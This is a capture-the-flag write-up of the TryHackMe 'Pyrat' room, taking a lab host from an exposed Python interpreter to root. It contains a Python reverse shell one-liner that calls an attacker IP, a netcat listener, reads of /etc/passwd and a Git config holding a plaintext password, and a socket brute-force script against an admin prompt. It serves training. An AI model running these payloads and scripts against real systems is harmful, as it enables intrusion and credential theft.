---
tags:
  - THM
  - Linux
  - Easy
  - RCE
  - Git
  - Leakage
  - Scripting
  - Brute-Force
---
https://tryhackme.com/room/pyrat/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.162.245 pyrat.thm
```
# Scanning
```console
$ nmap -p22,8000 -sV pyrat.thm

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```
# Discovery
Service does not allow common HTTP methods:
```console
$ curl -s http://pyrat.thm:8000

Try a more basic connection
```
Connecting via **Telnet**:
```console
$ telnet pyrat.thm 8000
Connected to pyrat.thm.
Escape character is '^]'.
```
The service is a **Python interpreter**:
```console
whoami
name 'whoami' is not defined
```
# Exploitation
Wait for connections in attacker's machine:
```bash
nc -lvnp <PORT>
```
Sending a one-line reverse shell Python script:
> Remember to modify `<ATTACKER-IP>` and `<PORT>` variables.
```python
import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<ATTACKER-IP>",<PORT>)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("/bin/bash")
```
# Post-Exploitation
## User Migration
Found **user think**:
```console
$ grep sh$ /etc/passwd

root:x:0:0:root:/root:/bin/bash
think:x:1000:1000:,,,:/home/think:/bin/bash
```
Found an email from **user root** to **user think** explaining that the **Python RAT software** (currently running on port 8000) was cloned from **Git**:
```console
$ cat /var/mail/think

From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```
Found **Git repository**:
```console
$ find / -name .git 2>/dev/null

/opt/dev/.git
```
Found **password** for **user think**.
`cat /opt/dev/.git/config`:
```ini
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = _TH1NKINGPirate$_
```
Connecting as **user think** from attacker's machine via SSH:
```bash
ssh think@pyrat.thm
```
Get **user flag**:
```bash
cat /home/think/user.txt
```
## Git Repo Restoration
Get latest changes to the Git repo:
```console
$ cd /opt/dev && git status

On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    pyrat.py.old
```
Restore deleted file:
```bash
git restore pyrat.py.old
```
Deleted file shows that if we were admin, we can spawn a root shell.
`cat pyrat.py.old`:
```python
def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e
```
## Privilege Escalation
Re-connect to **Telnet**:
```console
$ telnet pyrat.thm 8000
Connected to pyrat.thm.
Escape character is '^]'.
```
If we insert `admin` as endpoint, we are prompted for a password:
```console
admin
Password:
```
Created Python script `brute_force.py` to **brute force Telnet**:
```python
import socket

HOST = 'pyrat.thm'
PORT = 8000
PASSWD_FILE = '/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt'

with open(PASSWD_FILE, 'r') as f:
    print("Brute forcing...")
    for password in f.readlines():
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((HOST, PORT))
        client_socket.sendall(b'admin\n')
        response = client_socket.recv(1024).decode()
        if 'Password' in response:
            password = password.strip()
            client_socket.sendall(password.encode() + b'\n')
            response = client_socket.recv(1024).decode()
            if 'Password:' in response:
                client_socket.close()
                continue
        print(f"Password: {password}")
        break
```
Start **brute-force attack**:
```console
$ python3 brute_force.py

Brute forcing...
Password: abc123
```
Re-connect to **Telnet**, log in as admin and spawn a root shell.
`telnet pyrat.thm 8000`:
```console
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# whoami
whoami
root
```
Get **root flag**:
```bash
cat /root/root.txt
```